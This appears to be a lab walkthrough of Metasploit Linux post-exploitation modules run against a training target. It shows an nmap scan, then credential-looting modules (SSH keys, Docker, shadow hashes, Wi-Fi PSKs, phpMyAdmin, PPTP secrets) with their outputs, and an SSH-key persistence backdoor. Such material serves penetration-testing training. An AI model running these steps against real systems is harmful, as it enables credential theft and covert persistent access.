# Linux post exploitation modules

## Exploit the server

nmap
```
root@attackdefense:~# nmap -sS -sV -p- 192.209.15.3
Starting Nmap 7.70 ( https://nmap.org ) at 2021-05-02 00:12 UTC
Nmap scan report for target-1 (192.209.15.3)
Host is up (0.000015s latency).
Not shown: 65533 closed ports
PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 02:42:C0:D1:0F:03 (Unknown)
Service Info: Host: VICTIM-1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.20 seconds
```

## SSH creds

https://www.rapid7.com/db/modules/post/multi/gather/ssh_creds/

> This module will collect the contents of all users' .ssh directories on the targeted machine. Additionally, known_hosts and authorized_keys and any other files are also downloaded. This module is largely based on firefox_creds.rb. 

```
msf5 post(multi/gather/ssh_creds) > set SESSION 1
SESSION => 1
msf5 post(multi/gather/ssh_creds) > run

[*] Finding .ssh directories
[*] Looting 1 directories
[+] Downloaded /root/.ssh/authorized_keys -> /root/.msf4/loot/20210502002158_default_192.209.15.3_ssh.authorized_k_465869.txt
[-] Could not load SSH Key: Neither PUB key nor PRIV key
[+] Downloaded /root/.ssh/id_rsa -> /root/.msf4/loot/20210502002158_default_192.209.15.3_ssh.id_rsa_721179.txt
[-] Could not load SSH Key: Neither PUB key nor PRIV key
[+] Downloaded /root/.ssh/id_rsa.pub -> /root/.msf4/loot/20210502002158_default_192.209.15.3_ssh.id_rsa.pub_629088.txt
[-] Could not load SSH Key: Neither PUB key nor PRIV key
[+] Downloaded /root/.ssh/known_hosts -> /root/.msf4/loot/20210502002158_default_192.209.15.3_ssh.known_hosts_443334.txt
[-] Could not load SSH Key: Neither PUB key nor PRIV key
[*] Post module execution completed
```

## Docker creds

https://www.rapid7.com/db/modules/post/multi/gather/docker_creds/

> This module will collect the contents of all users' .docker directories on the targeted machine. If the user has already push to docker hub, chances are that the password was saved in base64 (default behavior). 

```
msf5 post(multi/gather/docker_creds) > set SESSION 1
SESSION => 1
msf5 post(multi/gather/docker_creds) > run

[*] Finding .docker directories
[*] Looting 1 directories
[*] Downloading /root/.docker/config.json -> config.json
[+] Found attackdefence:Str0ngPassword@123
[+] Saved credentials
[*] Post module execution completed
```

## Hash dump

https://www.rapid7.com/db/modules/post/linux/gather/hashdump/

> Post Module to dump the password hashes for all users on a Linux System 

```
msf5 post(linux/gather/hashdump) > set SESSION 1
SESSION => 1
msf5 post(linux/gather/hashdump) > set VERBOSE true
VERBOSE => true
msf5 post(linux/gather/hashdump) > run

[!] SESSION may not be compatible with this module.
[+] Shadow saved in: /root/.msf4/loot/20210502002455_default_192.209.15.3_linux.shadow_429827.txt
[+] passwd saved in: /root/.msf4/loot/20210502002455_default_192.209.15.3_linux.passwd_819746.txt
[+] Unshadowed Password File: /root/.msf4/loot/20210502002455_default_192.209.15.3_linux.hashes_925855.txt
[*] Post module execution completed
```

## Gather ecryptfs metadata

https://www.rapid7.com/db/modules/post/linux/gather/ecryptfs_creds/

> This module will collect the contents of all users' .ecrypts directories on the targeted machine. Collected "wrapped-passphrase" files can be cracked with John the Ripper (JtR) to recover "mount passphrases". 

```
msf5 post(linux/gather/ecryptfs_creds) > set SESSION 1
SESSION => 1
msf5 post(linux/gather/ecryptfs_creds) > run

[!] SESSION may not be compatible with this module.
[*] Finding .ecryptfs directories
[*] Looting 1 directories
[*] Downloading /root/.ecryptfs/sig-cache.txt -> sig-cache.txt
[+] File stored in: /root/.msf4/loot/20210502002652_default_192.209.15.3_ecryptfs.sigcac_615414.txt
[*] Post module execution completed
```

## psk enum

https://www.rapid7.com/db/modules/post/linux/gather/enum_psk/

> This module collects 802-11-Wireless-Security credentials such as Access-Point name and Pre-Shared-Key from your target CLIENT Linux machine using /etc/NetworkManager/system-connections/ files. The module gathers NetworkManager's plaintext "psk" information. 

```
msf5 post(linux/gather/enum_psk) > set SESSION 1
SESSION => 1
msf5 post(linux/gather/enum_psk) > run

[!] SESSION may not be compatible with this module.
[*] Reading file /etc/NetworkManager/system-connections/TopSecret_Network
[*] Reading file /etc/NetworkManager/system-connections/Wi-Fi connection 1
[*] Reading file /etc/NetworkManager/system-connections/Wi-Fi connection 2

802-11-wireless-security
========================

 AccessPoint-Name    PSK
 ----------------    ---
 Wi-Fi connection 1  AttackDefence_WiFi_123321
 Wi-Fi connection 2  Free_Internet

[+] Secrets stored in: /root/.msf4/loot/20210502002819_default_192.209.15.3_linux.psk.creds_240583.txt
[*] Done
[*] Post module execution completed
```

## XChat enum

https://www.rapid7.com/db/modules/post/linux/gather/enum_xchat/

> This module will collect XChat's config files and chat logs from the victim's machine. There are three actions you may choose: CONFIGS, CHATS, and ALL. The CONFIGS option can be used to collect information such as channel settings, channel/server passwords, etc. The CHATS option will simply download all the .log files. 

```
msf5 post(linux/gather/enum_xchat) > set SESSION 1
SESSION => 1
msf5 post(linux/gather/enum_xchat) > run

[!] SESSION may not be compatible with this module.
[+] 192.209.15.3:445 - servlist_.conf saved as /root/.msf4/loot/20210502003141_default_192.209.15.3_xchat.config_276437.txt
[+] 192.209.15.3:445 - xchat.conf saved as /root/.msf4/loot/20210502003141_default_192.209.15.3_xchat.config_288312.txt
[*] Post module execution completed
```

## Phpmyadmin creds 

https://www.rapid7.com/db/modules/post/linux/gather/phpmyadmin_credsteal/

> This module gathers Phpmyadmin creds from target linux machine. 

```
msf5 post(linux/gather/phpmyadmin_credsteal) > set SESSION 1
SESSION => 1
msf5 post(linux/gather/phpmyadmin_credsteal) > run

[!] SESSION may not be compatible with this module.

PhpMyAdmin Creds Stealer!

[+] PhpMyAdmin config found!
[+] Extracting creds
[+] User: root
[+] Password: N0tE@syT0Guess!!
[*] Storing credentials...
[+] Config file located at /root/.msf4/loot/20210502003438_default_192.209.15.3_phpmyadmin_conf_086956.txt
[*] Post module execution completed
```

## PPTP VPN enum

https://www.rapid7.com/db/modules/post/linux/gather/pptpd_chap_secrets/

> This module collects PPTP VPN information such as client, server, password, and IP from your target server's chap-secrets file. 

```
msf5 post(linux/gather/pptpd_chap_secrets) > set SESSION 1
SESSION => 1
msf5 post(linux/gather/pptpd_chap_secrets) > run

[!] SESSION may not be compatible with this module.
PPTPd chap-secrets
==================

 Client  Server                Secret          IP
 ------  ------                ------          --
 jackie  attackdefense.com     HiddenNetwork   10.10.10.10
 ninja   pentesteracademy.com  LearningIsReal  216.146.39.125
 peter   underground.onion     ReallySecure!!  246.234.63.133

[+] Secrets stored in: /root/.msf4/loot/20210502003602_default_192.209.15.3_linux.chapsecret_225219.txt
[*] Post module execution completed
```

## Add ssh key for persistence

https://www.rapid7.com/db/modules/post/linux/manage/sshkey_persistence/

> This module will add an SSH key to a specified user (or all), to allow remote login via SSH at any time. 

```
msf5 post(linux/manage/sshkey_persistence) > set SESSION 1
SESSION => 1
msf5 post(linux/manage/sshkey_persistence) > run

[!] SESSION may not be compatible with this module.
[*] Checking SSH Permissions
[*] Authorized Keys File: .ssh/authorized_keys
[*] Finding .ssh directories
[+] Storing new private key as /root/.msf4/loot/20210502003739_default_192.209.15.3_id_rsa_166075.txt
[*] Adding key to /root/.ssh/authorized_keys
[+] Key Added
[*] Post module execution completed
```

## Loot storage

```
root@attackdefense:~/.msf4/loot# ls
20210502002158_default_192.209.15.3_ssh.authorized_k_465869.txt  20210502002455_default_192.209.15.3_linux.passwd_819746.txt     20210502003141_default_192.209.15.3_xchat.config_288312.txt
20210502002158_default_192.209.15.3_ssh.id_rsa.pub_629088.txt    20210502002455_default_192.209.15.3_linux.shadow_429827.txt     20210502003438_default_192.209.15.3_phpmyadmin_conf_086956.txt
20210502002158_default_192.209.15.3_ssh.id_rsa_721179.txt        20210502002652_default_192.209.15.3_ecryptfs.sigcac_615414.txt  20210502003602_default_192.209.15.3_linux.chapsecret_225219.txt
20210502002158_default_192.209.15.3_ssh.known_hosts_443334.txt   20210502002819_default_192.209.15.3_linux.psk.creds_240583.txt  20210502003739_default_192.209.15.3_id_rsa_166075.txt
20210502002455_default_192.209.15.3_linux.hashes_925855.txt      20210502003141_default_192.209.15.3_xchat.config_276437.txt
```
